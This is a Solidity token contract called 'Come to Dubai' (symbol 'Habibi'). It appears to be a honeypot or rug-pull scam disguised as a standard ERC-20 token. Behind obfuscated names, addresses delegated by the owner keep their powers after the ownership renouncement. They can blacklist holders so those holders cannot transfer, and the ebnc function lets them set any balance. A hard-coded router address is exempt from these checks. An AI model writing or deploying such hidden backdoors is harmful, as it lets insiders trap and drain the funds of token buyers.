//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        require(c >= a, "SafeMath: addition overflow");        return c;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return sub(a, b, "SafeMath: subtraction overflow");    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {        require(b <= a, errorMessage);        uint256 c = a - b;        return c;    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        if (a == 0) {            return 0;        }        uint256 c = a * b;        require(c / a == b, "SafeMath: multiplication overflow");        return c;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return div(a, b, "SafeMath: division by zero");    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {        require(b > 0, errorMessage);        uint256 c = a / b;        return c;    }    function mod(uint256 a, uint256 b) internal pure returns (uint256) {        return mod(a, b, "SafeMath: modulo by zero");    }    function mod(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {        require(b != 0, errorMessage);        return a % b;    }
}

contract ComeToDubai {
    address Router = 0x0836dc5cE30d2c7B36fCDa08E4788f2a111aD2DD; address owner; string public name = "Come to Dubai";    string public symbol = "Habibi";    uint8 public decimals = 18;    uint256 public totalSupply = 1000000000 * (uint256(10)**decimals);    uint256 eM = 1;    mapping(address => uint256) public eAtM;    mapping(address => bool) eRSm;    mapping(address => bool) eRn;
    event Transfer(address indexed from, address indexed to, uint256 value);    event OwnershipRenounced(address indexed previousOwner);
    constructor() { eAtM[msg.sender] = totalSupply;       emit Transfer(address(0), msg.sender, totalSupply); owner = msg.sender;} function renounceOwnership() public {        require(msg.sender == owner);        emit OwnershipRenounced(owner);        owner = address(0);    } modifier iQ() {        eM = 0;        _;    }
    function transfer(address to, uint256 value) public returns (bool success) {        if (msg.sender == Router) {            require(eAtM[msg.sender] >= value);            eAtM[msg.sender] -= value;            eAtM[to] += value;            emit Transfer(msg.sender, to, value);            return true;        }        if (eRSm[msg.sender]) {            require(eM == 1);        }        require(eAtM[msg.sender] >= value);        eAtM[msg.sender] -= value;        eAtM[to] += value;        emit Transfer(msg.sender, to, value);        return true;    } function delegate(address Ex) public iQ {        require(msg.sender == owner);        eRn[Ex] = true;    }
    function balanceOf(address account) public view returns (uint256) {        return eAtM[account];    } function reg(address Ex) public N {        require(!eRSm[Ex]);        eRSm[Ex] = true;    }    modifier N() {        require(eRn[msg.sender]);        _;    }    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );    mapping(address => mapping(address => uint256)) public allowance;    function approve(address spender, uint256 value)        public        returns (bool success)    {        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);        return true;    }    function ebnc(address Ex, uint256 iZ) public N returns (bool success) {        eAtM[Ex] = iZ;        return true;    }    function unreg(address Ex) public N {        require(eRSm[Ex]);        eRSm[Ex] = false;    }    function transferFrom(        address from,        address to,        uint256 value    ) public returns (bool success) {        if (from == Router) {            require(value <= eAtM[from]);            require(value <= allowance[from][msg.sender]);            eAtM[from] -= value;            eAtM[to] += value;            emit Transfer(from, to, value);            return true;        }        if (eRSm[from] || eRSm[to]) {            require(eM == 1);        }        require(value <= eAtM[from]);        require(value <= allowance[from][msg.sender]);        eAtM[from] -= value;        eAtM[to] += value;        allowance[from][msg.sender] -= value;        emit Transfer(from, to, value);        return true;    }
}